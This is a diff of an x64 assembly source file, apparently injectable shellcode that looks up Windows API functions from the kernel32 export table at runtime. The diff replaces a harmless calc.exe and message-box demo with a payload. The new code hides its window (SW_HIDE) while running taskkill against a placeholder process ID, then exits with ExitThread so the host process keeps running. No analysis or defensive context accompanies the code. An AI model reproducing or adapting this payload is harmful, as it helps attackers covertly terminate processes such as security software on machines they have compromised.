@@ -1,6 +1,6 @@
-;taskkill.asm
+;taskkiller.asm
 ;License: MIT (http://www.opensource.org/licenses/mit-license.php)
-;compile ml64 taskkill.asm /link /entry:main
+;compile ml64 taskkiller.asm /link /entry:main
 
 .code
  
@@ -18,26 +18,14 @@ main proc
     lea rcx, kernel32_dll
     call lookup_api         ; get address of WinExec
     
-    mov rdx, 1              ; SW_SHOWNORMAL
+    mov rdx, 0              ; SW_HIDE
     lea rcx, cmdline_str    ; cmd line
     call rax
-    
-    lea rcx, user32_dll
-    call rax                ;load user32.dll
  
-    ;lea rdx, msgbox_func
-    ;lea rcx, user32_dll
-    ;call lookup_api         ;get address of MessageBoxA
- 
-    ;xor r9, r9              ;MB_OK
-    ;lea r8, title_str       ;caption
-    ;lea rdx, hello_str      ;Hello world
-    ;xor rcx, rcx            ;hWnd (NULL)
-    ;call rax                ;display message box
- 
-    lea rdx, exitproc_func
+    ;lea rdx, exitproc_func
+    lea rdx, exitthread_func
     lea rcx, kernel32_dll
-    call lookup_api         ;get address of ExitProcess
+    call lookup_api         ;get address of ExitThread
  
     xor rcx, rcx            ;exit code zero
     call rax                ;exit
@@ -47,15 +35,11 @@ main endp
 ; data constants 
 kernel32_dll    db  'KERNEL32.DLL', 0
 loadlib_func    db  'LoadLibraryA', 0
-user32_dll      db  'USER32.DLL', 0
 winexec_func    db  'WinExec', 0
-msgbox_func     db  'MessageBoxA', 0
 
-cmdline_str     db  'cmd.exe /c calc.exe', 0
-hello_str       db  'Hello world', 0
-title_str       db  'Message', 0
-exitproc_func   db  'ExitProcess', 0
+cmdline_str     db  'C:\Windows\System32\taskkill.exe /pid AAAAA', 0
 exitthread_func db  'ExitThread', 0
+;exitproc_func   db  'ExitProcess', 0
  
 ;look up address of function from DLL export table
 ;rcx=DLL name string, rdx=function name string
